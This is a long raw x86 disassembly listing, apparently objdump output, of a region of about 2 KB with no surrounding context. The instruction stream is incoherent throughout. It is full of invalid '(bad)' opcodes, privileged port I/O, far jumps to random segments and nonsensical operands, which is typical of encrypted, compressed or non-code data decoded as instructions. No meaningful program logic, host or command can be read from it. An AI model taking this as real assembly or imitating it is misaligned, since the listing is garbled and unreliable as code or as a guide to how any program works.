  4129a4:	dec    esi
  4129a5:	xchg   BYTE PTR [edi-0x61],dl
  4129a8:	(bad)  
  4129a9:	pushfw 
  4129ab:	xchg   ecx,eax
  4129ac:	mov    al,0xef
  4129ae:	pop    ecx
  4129af:	add    DWORD PTR es:[ebx],ebp
  4129b2:	out    0x3,eax
  4129b4:	retf   
  4129b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129b6:	push   edi
  4129b7:	dec    edi
  4129b8:	out    dx,eax
  4129b9:	out    dx,eax
  4129ba:	xor    ebx,DWORD PTR [edi-0x1b]
  4129bd:	sbb    al,bh
  4129bf:	imul   edx,edi,0xf364b147
  4129c5:	add    eax,0x59b86b5c
  4129ca:	loop   0x4129c2
  4129cc:	fwait
  4129cd:	inc    edi
  4129ce:	jmp    0xe6cb:0x35039326
  4129d5:	and    bl,BYTE PTR [ebp+eiz*8-0x2cfe3651]
  4129dc:	sbb    bl,bh
  4129de:	enter  0x6f14,0xc5
  4129e2:	cwde   
  4129e3:	and    eax,0x934c8b4b
  4129e8:	push   cs
  4129e9:	mov    bl,0x7f
  4129eb:	out    dx,al
  4129ec:	push   eax
  4129ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129ee:	mov    ah,0xfd
  4129f0:	cld    
  4129f1:	mov    edi,cs
  4129f3:	and    ch,0x4e
  4129f6:	dec    eax
  4129f7:	cmp    eax,0x9e6552f5
  4129fc:	enter  0x1377,0xa6
  412a00:	push   es
  412a01:	or     DWORD PTR [esi-0x65],ecx
  412a04:	push   cs
  412a05:	cmp    eax,0xc2cb88fd
  412a0a:	popa   
  412a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a0c:	pop    eax
  412a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a0e:	sbb    edx,DWORD PTR [ebx+0x3e53da2]
  412a14:	test   ch,bh
  412a16:	dec    esp
  412a17:	jmp    0x412a83
  412a19:	inc    ecx
  412a1a:	jae    0x412a29
  412a1c:	add    esp,DWORD PTR [ecx-0x3b]
  412a1f:	popa   
  412a20:	js     0x412a6a
  412a22:	add    BYTE PTR [edi-0x780d4674],cl
  412a28:	int    0x3e
  412a2a:	in     al,dx
  412a2b:	mov    al,0x7e
  412a2d:	pop    edi
  412a2e:	fwait
  412a2f:	push   eax
  412a30:	stc    
  412a31:	retf   0x852c
  412a34:	jae    0x4129f4
  412a36:	cmp    BYTE PTR [esi],al
  412a38:	(bad)  
  412a39:	hlt    
  412a3a:	add    al,0x1c
  412a3c:	mov    BYTE PTR [edx+0x7f827cfc],al
  412a42:	test   BYTE PTR [eax+0x6c],0xa7
  412a46:	(bad)  
  412a48:	xchg   esi,eax
  412a49:	pop    ds
  412a4a:	in     eax,0x15
  412a4c:	shl    bh,1
  412a4e:	gs mov esp,0xeaa0b2f5
  412a54:	lds    eax,FWORD PTR [ebp-0x53]
  412a57:	sub    DWORD PTR [eax],edi
  412a59:	aaa    
  412a5a:	pusha  
  412a5b:	outs   dx,DWORD PTR ds:[esi]
  412a5c:	sar    al,0xc0
  412a5f:	dec    ebp
  412a60:	in     eax,dx
  412a61:	ror    DWORD PTR [ecx],0x27
  412a64:	cdq    
  412a65:	pop    edx
  412a66:	mov    ch,0x4
  412a68:	stc    
  412a69:	xchg   edi,eax
  412a6a:	xchg   DWORD PTR [eax],ecx
  412a6c:	dec    edx
  412a6d:	pop    edx
  412a6e:	cmp    ebp,esi
  412a70:	mov    esi,0xc6c6b62d
  412a75:	xor    DWORD PTR [eax+edx*1-0x2e],ebx
  412a79:	jne    0x412a3a
  412a7b:	inc    esi
  412a7c:	fnstcw WORD PTR [ebp+0x52]
  412a7f:	push   0x1cbca21
  412a84:	pop    ds
  412a85:	or     eax,0xa9d7238d
  412a8a:	repz aam 0x56
  412a8d:	jle    0x412a81
  412a8f:	(bad)  
  412a90:	cmp    DWORD PTR [eax+0x53ac78cb],edx
  412a96:	push   edi
  412a97:	or     al,0x69
  412a99:	sbb    bh,bl
  412a9b:	mov    bl,0x3e
  412a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a9e:	sbb    esi,DWORD PTR [eax-0x5d1992c6]
  412aa4:	sub    DWORD PTR [esi+0x100289a1],esp
  412aaa:	pusha  
  412aab:	xor    eax,0xbc4e34da
  412ab0:	xchg   DWORD PTR [edi],ebx
  412ab2:	mov    al,ds:0x6f12ff48
  412ab7:	ret    0x44f6
  412aba:	dec    ebp
  412abb:	cmc    
  412abc:	jmp    0x412b2b
  412abe:	fcmovb st,st(5)
  412ac0:	jns    0x412b22
  412ac2:	hlt    
  412ac3:	pusha  
  412ac4:	loope  0x412b42
  412ac6:	jmp    0x412b35
  412ac8:	pop    ds
  412ac9:	adc    edx,edi
  412acb:	jle    0x412b39
  412acd:	fiadd  WORD PTR [ebx]
  412acf:	cmc    
  412ad0:	mov    dl,0x1a
  412ad2:	mov    dl,0xbb
  412ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ad5:	fcmovnu st,st(5)
  412ad7:	ret    0xf046
  412ada:	inc    esp
  412adb:	inc    ecx
  412adc:	retf   
  412add:	push   cs
  412ade:	jns    0x412a8c
  412ae0:	out    dx,eax
  412ae1:	dec    edx
  412ae2:	shl    al,0xeb
  412ae5:	sar    DWORD PTR [edx-0x62],cl
  412ae8:	sbb    DWORD PTR [esi+0x3a],edx
  412aeb:	jl     0x412b43
  412aed:	adc    eax,0x97eff413
  412af2:	fidiv  DWORD PTR [edi]
  412af4:	xor    dl,bh
  412af6:	inc    edx
  412af7:	xchg   ecx,eax
  412af8:	inc    ebx
  412af9:	into   
  412afa:	push   ebp
  412afb:	sub    bl,BYTE PTR [edi-0x68f9fb47]
  412b01:	loopne 0x412af4
  412b03:	push   ss
  412b04:	cld    
  412b05:	(bad)  
  412b06:	fild   QWORD PTR [ebx+0x2b]
  412b09:	(bad)  [ecx+0x64659da6]
  412b0f:	(bad)  
  412b10:	(bad)  
  412b11:	(bad)  
  412b12:	(bad)  [edi-0x11]
  412b15:	fs sbb eax,0xa6e733d7
  412b1b:	inc    ebp
  412b1c:	loope  0x412ae2
  412b1e:	add    al,0x60
  412b20:	stos   DWORD PTR es:[edi],eax
  412b21:	mov    ?,WORD PTR [edx]
  412b23:	cmp    dh,bl
  412b25:	xor    BYTE PTR [esi],bl
  412b27:	out    0x32,al
  412b29:	icebp  
  412b2a:	into   
  412b2b:	xor    eax,0x871420f8
  412b30:	mov    ebx,0xe2113046
  412b35:	push   ebp
  412b36:	ror    DWORD PTR [edx-0x29],cl
  412b39:	jae    0x412b19
  412b3b:	outs   dx,BYTE PTR ds:[esi]
  412b3c:	and    dl,0x6b
  412b3f:	mov    edi,0x8b88e72a
  412b44:	out    dx,eax
  412b45:	pop    ds
  412b46:	dec    ebp
  412b47:	pop    ebx
  412b48:	sbb    al,0x49
  412b4a:	lods   eax,DWORD PTR ds:[esi]
  412b4b:	lods   eax,DWORD PTR ds:[esi]
  412b4c:	test   BYTE PTR [edi],dl
  412b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b4f:	pop    ds
  412b50:	adc    DWORD PTR [ebp-0x1],edi
  412b53:	aas    
  412b54:	ret    0x91ef
  412b57:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  412b59:	pop    esi
  412b5a:	sub    DWORD PTR [eax+edi*8-0x7fb071bd],edx
  412b61:	ins    BYTE PTR es:[edi],dx
  412b62:	stos   BYTE PTR es:[edi],al
  412b63:	cdq    
  412b64:	dec    edi
  412b65:	dec    esi
  412b66:	loop   0x412bd8
  412b68:	dec    eax
  412b69:	pop    eax
  412b6a:	dec    eax
  412b6b:	hlt    
  412b6c:	pop    ss
  412b6d:	out    0x94,al
  412b6f:	int3   
  412b70:	dec    ebx
  412b71:	nop
  412b72:	out    dx,al
  412b73:	mov    ebx,0xf1eb7290
  412b78:	xor    cl,BYTE PTR [ecx+0x3b]
  412b7b:	sbb    eax,DWORD PTR [edi+0x7243e85d]
  412b81:	out    0x23,al
  412b83:	push   0x7cdf268f
  412b88:	dec    esi
  412b89:	pop    ebx
  412b8a:	outs   dx,DWORD PTR ds:[esi]
  412b8b:	fisub  WORD PTR [ecx*2+0x2caf6cb8]
  412b92:	pop    ebx
  412b93:	push   ebx
  412b94:	(bad)  
  412b95:	ins    DWORD PTR es:[edi],dx
  412b96:	lahf   
  412b97:	sub    al,0xb5
  412b99:	xor    al,0x3d
  412b9b:	fstp   DWORD PTR [edi]
  412b9d:	xchg   esi,eax
  412b9e:	add    ch,bh
  412ba0:	jle    0x412b41
  412ba2:	fs cmp eax,0x6825fd00
  412ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ba9:	(bad)  
  412baa:	loop   0x412bd4
  412bac:	gs fcomip st,st(0)
  412baf:	sub    dh,BYTE PTR [esi-0x38370c44]
  412bb5:	fldenv [edi+esi*4+0xf]
  412bb9:	mov    BYTE PTR [ecx+edi*1+0x4c],dh
  412bbd:	cs cwde 
  412bbf:	jae    0x412b94
  412bc1:	sbb    al,0x83
  412bc3:	stos   DWORD PTR es:[edi],eax
  412bc4:	xor    DWORD PTR ds:0x4e6854d2,0xffffff9d
  412bcb:	mov    ah,0xc6
  412bcd:	std    
  412bce:	mov    ebp,0xcccb7d0d
  412bd3:	sti    
  412bd4:	push   ebx
  412bd5:	push   cs
  412bd6:	pushw  es
  412bd8:	out    0xbd,eax
  412bda:	mov    es,WORD PTR [ebx]
  412bdc:	xchg   ecx,eax
  412bdd:	push   edi
  412bde:	(bad)  
  412bdf:	shl    BYTE PTR [edi-0x59],cl
  412be2:	push   edx
  412be3:	out    0x8b,eax
  412be5:	imul   edx,DWORD PTR ds:0xbb7875b5,0x84225ee5
  412bef:	sub    BYTE PTR [ebp-0x2e],al
  412bf2:	sub    bh,BYTE PTR [eax]
  412bf4:	mov    cl,0xb4
  412bf6:	retf   0x9863
  412bf9:	adc    dh,0xd8
  412bfc:	in     eax,dx
  412bfd:	call   DWORD PTR [eax]
  412bff:	mov    al,ds:0x9e5658c4
  412c04:	sbb    eax,0x47a6e792
  412c09:	out    0xe9,eax
  412c0b:	inc    ecx
  412c0c:	xchg   esp,eax
  412c0d:	mov    bh,0xe6
  412c0f:	das    
  412c10:	nop
  412c11:	mov    eax,DWORD PTR [edi-0x2f]
  412c14:	mov    ecx,0x7149aef9
  412c19:	imul   ebx,DWORD PTR [esi+0x14bcf0bd],0xb2c53570
  412c23:	outs   dx,BYTE PTR ds:[esi]
  412c24:	call   0x4113:0x1cf978aa
  412c2b:	cdq    
  412c2c:	inc    esp
  412c2d:	or     al,0xd
  412c2f:	push   esp
  412c30:	adc    ecx,DWORD PTR [ebp-0x5df400ed]
  412c36:	sbb    eax,0xe64a8b04
  412c3b:	in     al,0xc9
  412c3d:	enter  0x327e,0x96
  412c41:	ds cmp eax,0x922c5828
  412c47:	out    dx,al
  412c48:	dec    edx
  412c49:	mov    esi,0xa7a233f0
  412c4e:	sbb    ebp,DWORD PTR gs:[ebx]
  412c51:	adc    bh,BYTE PTR [esi]
  412c53:	add    DWORD PTR [edi-0x25],edx
  412c56:	retf   0x120d
  412c59:	outs   dx,DWORD PTR ds:[esi]
  412c5a:	xor    dh,bl
  412c5c:	shl    BYTE PTR [edi],cl
  412c5e:	cmp    edx,DWORD PTR [ecx+0x27]
  412c61:	and    DWORD PTR [ebx-0x14ae7dff],edx
  412c67:	int    0xb2
  412c69:	cs call 0xdd3f7dcf
  412c6f:	mov    esi,DWORD PTR [edx+eax*2]
  412c72:	fst    DWORD PTR [edx]
  412c74:	and    al,0x45
  412c76:	test   ch,dh
  412c78:	enter  0x77fa,0xda
  412c7c:	pusha  
  412c7d:	mov    ah,BYTE PTR ds:0x1f441c5d
  412c83:	sub    DWORD PTR [eax+0x7e744146],0xf1d51721
  412c8d:	enter  0x3f85,0x10
  412c91:	in     al,0x98
  412c93:	cdq    
  412c94:	push   ss
  412c95:	jmp    0x708c8442
  412c9a:	pop    DWORD PTR [edi]
  412c9c:	adc    ch,BYTE PTR [ebp-0x27]
  412c9f:	fsub   DWORD PTR [edi]
  412ca1:	ror    BYTE PTR [edi],cl
  412ca3:	lahf   
  412ca4:	jmp    0x412cd0
  412ca6:	push   ebp
  412ca7:	mov    esi,DWORD PTR [eax]
  412ca9:	inc    edi
  412caa:	jns    0x412cbb
  412cac:	arpl   WORD PTR [esi],cx
  412cae:	(bad)  
  412caf:	xor    ecx,DWORD PTR [esi-0x2fa47e09]
  412cb5:	sub    BYTE PTR [eax+0x54],0x5
  412cb9:	pop    ebp
  412cba:	mov    ebp,0xedc69436
  412cbf:	push   ebx
  412cc0:	fnstcw WORD PTR [esi]
  412cc2:	dec    ebx
  412cc3:	bound  esp,QWORD PTR [edi-0x53]
  412cc6:	shr    DWORD PTR [esi],cl
  412cc8:	xchg   ebx,eax
  412cc9:	inc    ecx
  412cca:	ins    BYTE PTR es:[edi],dx
  412ccb:	xor    DWORD PTR [edi+0x318b6c77],eax
  412cd1:	or     BYTE PTR [ebx+0x5008df59],0xe2
  412cd8:	xchg   edx,eax
  412cd9:	imul   eax,esp,0x56
  412cdc:	cwde   
  412cdd:	sti    
  412cde:	clc    
  412cdf:	jno    0x412d33
  412ce1:	mov    DWORD PTR [ebx-0x6b],esi
  412ce4:	leave  
  412ce5:	icebp  
  412ce6:	inc    esp
  412ce7:	xor    edx,edi
  412ce9:	jnp    0x412d4b
  412ceb:	add    al,0x9e
  412ced:	jbe    0x412d14
  412cef:	in     eax,0xf7
  412cf1:	xor    dh,BYTE PTR [ebx-0x6fb69747]
  412cf7:	mul    BYTE PTR [edx-0x48]
  412cfa:	jle    0x412d07
  412cfc:	fcmove st,st(4)
  412cfe:	inc    edi
  412cff:	mov    dh,0x39
  412d01:	test   eax,0xd3ace62e
  412d06:	add    BYTE PTR [edi],ah
  412d08:	sbb    dh,BYTE PTR [esi]
  412d0a:	outs   dx,BYTE PTR ds:[esi]
  412d0b:	xor    BYTE PTR [ebx+0x47fb8783],dl
  412d11:	adc    al,0xdf
  412d13:	lahf   
  412d14:	add    al,0xd2
  412d16:	push   edi
  412d17:	fadd   QWORD PTR [esp+ecx*4+0x31866280]
  412d1e:	push   cs
  412d1f:	sbb    dl,dl
  412d21:	fisttp WORD PTR [edx]
  412d23:	in     eax,dx
  412d24:	dec    ebx
  412d25:	add    esi,DWORD PTR [ecx+0x70]
  412d28:	cli    
  412d29:	cmp    bl,bl
  412d2b:	aas    
  412d2c:	es mov ebx,0x49916114
  412d32:	sub    BYTE PTR [ebp+ebx*2-0x3c8bf3a6],0xea
  412d3a:	inc    edx
  412d3b:	inc    esi
  412d3c:	or     ch,ah
  412d3e:	pop    esi
  412d3f:	adc    al,0x9b
  412d41:	jmp    0x83c534cb
  412d46:	jmp    0x56e1:0x851636c8
  412d4d:	rcr    BYTE PTR [ebx+0x7b],0x5e
  412d51:	sub    al,0x65
  412d53:	add    BYTE PTR [ecx+0x16],dh
  412d56:	xor    al,0x66
  412d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d59:	mov    ch,0x66
  412d5b:	ins    BYTE PTR es:[edi],dx
  412d5c:	ret    
  412d5d:	cld    
  412d5e:	les    edx,FWORD PTR ds:0x63852307
  412d64:	mov    eax,ds:0xefc9ef45
  412d69:	call   0xcdbb2b3f
  412d6e:	fwait
  412d6f:	shl    BYTE PTR [eax+0x55820b7f],1
  412d75:	and    al,0xbc
  412d77:	mov    ch,0xe8
  412d79:	jbe    0x412de1
  412d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d7c:	pop    ds
  412d7d:	mov    eax,ds:0x462f4fcd
  412d82:	mov    ebp,ebx
  412d84:	mov    ds:0x4dbefae2,eax
  412d89:	rcr    bl,0x7f
  412d8c:	bnd jl 0x412ddd
  412d8f:	xchg   DWORD PTR [edi+0x32b3cff1],eax
  412d95:	retf   0x8f82
  412d98:	ins    DWORD PTR es:[edi],dx
  412d99:	ret    0x9528
  412d9c:	data16 aad 0xf6
  412d9f:	test   bh,bh
  412da1:	je     0x412d9a
  412da3:	cmc    
  412da4:	loopne 0x412db6
  412da6:	inc    esp
  412da7:	gs sbb eax,0xd947066b
  412dad:	call   0xcf36:0x16ddf808
  412db4:	mov    eax,ds:0x13c9f4dc
  412db9:	test   dl,ah
  412dbb:	add    esp,esp
  412dbd:	clc    
  412dbe:	and    DWORD PTR [edx+0x6d],esi
  412dc1:	mov    edi,0x753b6c1c
  412dc6:	sar    DWORD PTR [edi+0x3a],cl
  412dc9:	enter  0x32c2,0x89
  412dcd:	sbb    BYTE PTR [esp+edi*4],0xb4
  412dd1:	loop   0x412d95
  412dd3:	stc    
  412dd4:	cmp    BYTE PTR [ecx+edx*8-0x7f],0x21
  412dd9:	jmp    0xe6f45ef
  412dde:	jbe    0x412e5d
  412de0:	cmovle esi,esp
  412de3:	adc    bh,ah
  412de5:	xor    eax,0x806ef86b
  412dea:	xor    eax,DWORD PTR [ebp+0x78]
  412ded:	addr16 mov ebp,0xf2e743e8
  412df3:	mov    ebx,ecx
  412df5:	fcmovb st,st(6)
  412df7:	fdiv   QWORD PTR [ebx]
  412df9:	and    al,0x7f
  412dfb:	mov    al,0x60
  412dfd:	cmp    BYTE PTR [edx+0x37878fc7],dh
  412e03:	daa    
  412e04:	cmp    bl,BYTE PTR ds:0x56231345
  412e0a:	cmp    BYTE PTR [esi-0x4145c155],dl
  412e10:	inc    edi
  412e11:	or     ch,bh
  412e13:	sbb    dh,BYTE PTR [eax+edx*4]
  412e16:	mov    al,0x9a
  412e18:	stos   DWORD PTR es:[edi],eax
  412e19:	mov    ?,WORD PTR [edx+ebp*1+0x34]
  412e1d:	xor    ebp,DWORD PTR [ebp-0x55]
  412e20:	xor    DWORD PTR [ebp+0x2733e00d],0x4e
  412e27:	cmp    al,0x6d
  412e29:	push   es
  412e2a:	in     al,dx
  412e2b:	aas    
  412e2c:	inc    eax
  412e2d:	pop    es
  412e2e:	and    dl,BYTE PTR [eax]
  412e30:	cmp    ecx,ecx
  412e32:	push   edx
  412e33:	mov    esi,eax
  412e35:	push   cs
  412e36:	add    DWORD PTR [ebp-0x73997c2b],edx
  412e3c:	pushw  ss
  412e3e:	mov    BYTE PTR [ebx+0x76],0xe4
  412e42:	xor    esp,ebx
  412e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e45:	cmp    edi,edx
  412e47:	jecxz  0x412eb0
  412e49:	int    0xb3
  412e4b:	aad    0xa7
  412e4d:	stc    
  412e4e:	ror    esi,0x1c
  412e51:	pop    ds
  412e52:	les    ecx,FWORD PTR [ebp+0x21]
  412e55:	or     ebx,ebp
  412e57:	adc    DWORD PTR [eax-0x3c],ecx
  412e5a:	aad    0xa6
  412e5c:	xchg   bl,bh
  412e5e:	push   ebp
  412e5f:	push   esp
  412e60:	cmp    eax,0x244051cd
  412e65:	fdivr  st,st(2)
  412e67:	(bad)  
  412e69:	lds    ebx,FWORD PTR [edi-0x47c6090c]
  412e6f:	mov    DWORD PTR [ecx],esp
  412e71:	imul   edx,DWORD PTR [edi-0x74ba2178],0x55069a9
  412e7b:	xchg   esi,edx
  412e7d:	push   esi
  412e7e:	mov    ah,0xc8
  412e80:	ficomp DWORD PTR [edx]
  412e82:	mov    edi,0x9c352b14
  412e87:	mov    WORD PTR [ecx+0x30],?
  412e8a:	xor    bh,cl
  412e8c:	js     0x412e80
  412e8e:	out    0x5f,al
  412e90:	mov    al,ds:0x7fd507a7
  412e95:	push   edi
  412e96:	je     0x412f0e
  412e98:	and    bl,BYTE PTR [edx]
  412e9a:	and    ebx,DWORD PTR [esi-0x6034f30a]
  412ea0:	push   0x25af4143
  412ea5:	cld    
  412ea6:	jnp    0x412ebb
  412ea8:	int    0xeb
  412eaa:	out    0xd8,eax
  412eac:	pop    esi
  412ead:	jb     0x412f08
  412eaf:	sub    BYTE PTR [ebx],cl
  412eb1:	jbe    0x412ece
  412eb3:	cmp    DWORD PTR [eax+edi*8],edx
  412eb6:	in     al,0xa5
  412eb8:	lahf   
  412eb9:	add    al,0xc1
  412ebb:	mov    dh,0x5d
  412ebd:	stc    
  412ebe:	into   
  412ebf:	push   ss
  412ec0:	xor    DWORD PTR [ebx+0x4d65ac52],0xffffffc5
  412ec7:	stos   DWORD PTR es:[edi],eax
  412ec8:	push   eax
  412ec9:	dec    ebp
  412eca:	cmp    BYTE PTR [edx-0x71bd6ffd],al
  412ed0:	inc    esi
  412ed1:	adc    BYTE PTR [edx+0x45],dh
  412ed4:	push   eax
  412ed5:	pop    ecx
  412ed6:	inc    edx
  412ed7:	cwde   
  412ed8:	inc    eax
  412ed9:	xchg   ecx,eax
  412eda:	xchg   esp,ecx
  412edc:	xor    al,0x42
  412ede:	gs xchg ah,bh
  412ee1:	sbb    ah,dh
  412ee3:	mov    DWORD PTR [ebp+0x2e2033d5],edi
  412ee9:	cmp    eax,0xbfb9a82b
  412eee:	retf   0xbb01
  412ef1:	sub    eax,0x210c1304
  412ef6:	mov    esp,0x8e4f98fb
  412efb:	mov    ds:0xf5249e36,al
  412f00:	add    ah,bl
  412f02:	test   BYTE PTR [eax],cl
  412f04:	inc    ebx
  412f05:	popf   
  412f06:	or     DWORD PTR [ebp+0x68],0xffffffc2
  412f0a:	jo     0x412ed1
  412f0c:	shr    DWORD PTR [eax],0x5d
  412f0f:	sbb    DWORD PTR [edx+eiz*8+0x6c],0xbcc6d2e0
  412f17:	cmp    BYTE PTR [edi],0x57
  412f1a:	imul   esp,DWORD PTR [edx+ecx*1-0x2c03fc5d],0x97a22c08
  412f25:	test   bl,dl
  412f27:	xchg   DWORD PTR [edi+0x44],esi
  412f2a:	inc    ebp
  412f2b:	dec    ecx
  412f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f2d:	sub    BYTE PTR [edi+0x15],bh
  412f30:	out    dx,al
  412f31:	xor    al,0xe5
  412f33:	sti    
  412f34:	mov    bl,dl
  412f36:	xor    BYTE PTR [edi+0x4757cbfe],bh
  412f3c:	pop    ecx
  412f3d:	neg    DWORD PTR [esi-0x299f7f3d]
  412f43:	and    DWORD PTR [edi],esi
  412f45:	pop    ds
  412f46:	sub    BYTE PTR [ebp+0x79],dl
  412f49:	sbb    ecx,0x79c4e94d
  412f4f:	add    ch,BYTE PTR [esp+esi*8+0x7a9f5e6]
  412f56:	test   al,0x4f
  412f58:	adc    BYTE PTR ss:[ecx-0x42880f65],0x7c
  412f60:	imul   ebx,esp,0xfffffff1
  412f63:	dec    edx
  412f64:	aaa    
  412f65:	fwait
  412f66:	ss sub al,0x3e
  412f69:	sar    DWORD PTR [esi+0x1cd9f57],0x6
  412f70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f71:	jg     0x412f53
  412f73:	push   edi
  412f74:	cli    
  412f75:	ret    
  412f76:	xor    eax,0xc2e70f18
  412f7b:	add    al,0xb7
  412f7d:	sti    
  412f7e:	sbb    BYTE PTR [esi-0x3a],ch
  412f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f82:	mov    al,ds:0xd190a36f
  412f87:	jno    0x412f9c
  412f89:	mov    eax,ds:0x2adeaf4c
  412f8e:	adc    edi,DWORD PTR [ecx+ebx*8-0x57]
  412f92:	ds mov bh,bh
  412f95:	cmp    al,0x1d
  412f97:	xor    DWORD PTR fs:[ebx-0x68ea3f6e],ecx
  412f9e:	aaa    
  412f9f:	or     al,0x95
  412fa1:	shr    cl,1
  412fa3:	arpl   WORD PTR [esi+0x5fb7433c],dx
  412fa9:	ins    DWORD PTR es:[edi],dx
  412faa:	mov    al,0x76
  412fac:	cmp    edi,esp
  412fae:	out    dx,eax
  412faf:	inc    ebp
  412fb0:	frstor [edx]
  412fb2:	into   
  412fb3:	mov    DWORD PTR [edx+eiz*1],0x48943b14
  412fba:	shl    bl,1
  412fbc:	pop    edx
  412fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fbf:	and    eax,0x9eeccbd7
  412fc4:	sbb    esp,DWORD PTR [ecx+0x34842e00]
  412fca:	inc    ecx
  412fcb:	adc    cl,BYTE PTR [eax+0x2a72127d]
  412fd1:	cmp    BYTE PTR [eax-0x54186926],cl
  412fd7:	cld    
  412fd8:	xor    al,0xb9
  412fda:	cmp    ah,bl
  412fdc:	retf   
  412fdd:	pop    ebp
  412fde:	or     BYTE PTR [ecx+0x5b],bl
  412fe1:	dec    ecx
  412fe2:	loopne 0x413004
  412fe4:	out    dx,eax
  412fe5:	mov    cl,BYTE PTR [ebx-0x10]
  412fe8:	inc    ebp
  412fe9:	ret    
  412fea:	mov    ecx,0x655f517a
  412fef:	ins    DWORD PTR es:[edi],dx
  412ff0:	mov    al,0x2b
  412ff2:	mov    ecx,esi
  412ff4:	sar    eax,cl
  412ff6:	dec    esi
  412ff7:	or     ebx,esp
  412ff9:	loop   0x413005
  412ffb:	dec    esp
  412ffc:	mov    ah,0x4e
  412ffe:	fild   WORD PTR [ebx+0x554e4504]
  413004:	push   0xffffff9d
  413006:	jns    0x413053
  413008:	jge    0x413039
  41300a:	cld    
  41300b:	scas   al,BYTE PTR es:[edi]
  41300c:	test   DWORD PTR [esi-0x54587497],eax
  413012:	and    BYTE PTR [esi+0x7d2a1d8],cl
  413018:	pop    ss
  413019:	and    al,0xad
  41301b:	call   0x1775b661
  413020:	int    0xa6
  413022:	jae    0x413097
  413024:	ret    
  413025:	mov    esp,0xee51bdb5
  41302a:	out    0x10,eax
  41302c:	(bad)  
  41302d:	out    0x61,eax
  41302f:	(bad)  
  413030:	pop    ecx
  413031:	mov    al,0x63
  413033:	ja     0x412fd2
  413035:	div    ebx
  413037:	push   0x5d
  413039:	inc    BYTE PTR [eax]
  41303b:	or     BYTE PTR [ecx-0x22b92743],bl
  413041:	xor    BYTE PTR [ebx],0x8d
  413044:	mov    WORD PTR [edx+0x6f],?
  413047:	imul   eax,edx,0x2b
  41304a:	pop    edi
  41304b:	sbb    DWORD PTR [ebx-0x70],ebp
  41304e:	nop
  41304f:	or     esp,ebp
  413051:	std    
  413052:	push   0x42
  413054:	dec    esi
  413055:	fiadd  WORD PTR [eax+0x32]
  413058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413059:	add    al,0x26
  41305b:	sub    bh,dh
  41305d:	ins    BYTE PTR es:[edi],dx
  41305e:	into   
  41305f:	test   eax,0x6d9fe46a
  413064:	xchg   edi,eax
  413065:	pop    ebp
  413066:	in     al,dx
  413067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413068:	out    0xb7,al
  41306a:	bound  ebx,QWORD PTR [ecx+edi*2-0x40]
  41306e:	sub    edx,edx
  413070:	mov    esi,eax
  413072:	xchg   edi,eax
  413073:	popa   
  413074:	mov    DWORD PTR [ebx-0x36],0x2f58ea9d
  41307b:	sub    DWORD PTR [ebx+eax*1-0x422c9ae6],0xe20b0f8b
  413086:	sahf   
  413087:	add    ebx,DWORD PTR [ebp+0x63]
  41308a:	or     BYTE PTR [ebx+0x6146dd3c],dh
  413090:	push   esi
  413091:	push   0xffffffb4
  413093:	stc    
  413094:	add    al,0x6c
  413096:	xchg   BYTE PTR [ebp-0x7bed28ac],bl
  41309c:	clc    
  41309d:	xchg   DWORD PTR [edi-0x8],esp
  4130a0:	ret    0x5fdd
  4130a3:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130a5:	data16 cmp bl,BYTE PTR [eax+0x79]
  4130a9:	mov    bh,0x42
  4130ab:	inc    ebx
  4130ac:	sub    BYTE PTR [ebp-0x26b571cd],dh
  4130b2:	cs xchg esp,eax
  4130b4:	clc    
  4130b5:	fnstenv [eax+0x338400a1]
  4130bb:	test   eax,0xf1c0194c
  4130c0:	nop
  4130c1:	icebp  
  4130c2:	or     al,0x46
  4130c4:	dec    esi
  4130c5:	adc    BYTE PTR [ecx+edx*4+0x12],ah
  4130c9:	inc    edi
  4130ca:	jmp    0x413147
  4130cc:	xor    eax,0xbe7760f8
  4130d1:	in     eax,dx
  4130d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130d3:	sbb    cl,bh
  4130d5:	mov    esp,0x7285e695
  4130da:	mov    esi,ecx
  4130dc:	in     eax,dx
  4130dd:	push   esi
  4130de:	xor    BYTE PTR [edi+0x6f],dh
  4130e1:	in     eax,0x3c
  4130e3:	xor    bh,BYTE PTR [edx]
  4130e5:	mov    edx,0x1a39ff74
  4130ea:	jge    0x41315e
  4130ec:	or     eax,0x8fb9541f
  4130f1:	mov    DWORD PTR [edx],esp
  4130f3:	pushf  
  4130f4:	pop    edx
  4130f5:	int3   
  4130f6:	aad    0xa5
  4130f8:	test   DWORD PTR [ecx*1-0x7bdeb5be],edx
  4130ff:	jnp    0x41314d
  413101:	or     esi,eax
  413103:	push   ebx
  413104:	ins    DWORD PTR es:[edi],dx
  413105:	out    dx,eax
  413106:	cmp    DWORD PTR [ecx+0x8],edi
  413109:	mov    ebp,0xff8894f4
  41310e:	pop    ds
  41310f:	enter  0x1ddb,0xe7
  413113:	push   ss
  413114:	xchg   esp,eax
  413115:	ins    DWORD PTR es:[edi],dx
  413116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413117:	mov    bh,0x70
  413119:	lods   eax,DWORD PTR ds:[esi]
  41311a:	and    eax,0xc4f8525e
  41311f:	mov    ebx,0x9e60359e
  413124:	mov    ?,WORD PTR [edx]
  413126:	cmp    dl,dh
  413128:	xor    BYTE PTR [esi-0x78f9abd1],bh
